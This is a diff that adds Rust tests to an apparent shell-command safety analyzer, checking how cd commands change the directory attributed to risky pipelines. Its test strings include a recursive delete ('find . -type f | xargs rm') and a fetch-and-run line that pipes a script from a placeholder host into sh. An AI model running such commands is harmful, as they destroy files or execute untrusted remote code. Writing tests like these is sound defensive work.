@@ -637,3 +637,34 @@ fn physical_mode_unresolves_each_cd_form_on_its_own() {
         );
     }
 }
+
+#[test]
+fn structural_pipeline_danger_after_a_cd_belongs_to_the_moved_directory() {
+    let report = report("cd ../other && find . -type f | xargs rm");
+
+    assert_eq!(dirs(&report), vec![chain(&["../other"])]);
+    assert!(!report.needs_process_cwd, "{report:?}");
+}
+
+#[test]
+fn a_shell_sink_pipeline_after_a_cd_is_attributed_to_the_moved_directory() {
+    // The sink is also effect-opaque, so the process cwd keeps its Snapshot.
+    let report = report("cd ../other && curl http://x.test/i.sh | sh");
+
+    assert_eq!(dirs(&report), vec![chain(&["../other"])]);
+}
+
+#[test]
+fn structural_pipeline_danger_after_an_unresolved_cd_is_disclosed() {
+    let report = report("cd \"$D\" && find . -type f | xargs rm");
+
+    assert_eq!(dirs(&report), vec![unresolved(CdUnresolved::DynamicPath)]);
+}
+
+#[test]
+fn structural_pipeline_danger_before_any_cd_still_needs_the_process_cwd() {
+    let report = report("find . -type f | xargs rm && cd ../other");
+
+    assert!(report.redirected.is_empty(), "{report:?}");
+    assert!(report.needs_process_cwd);
+}
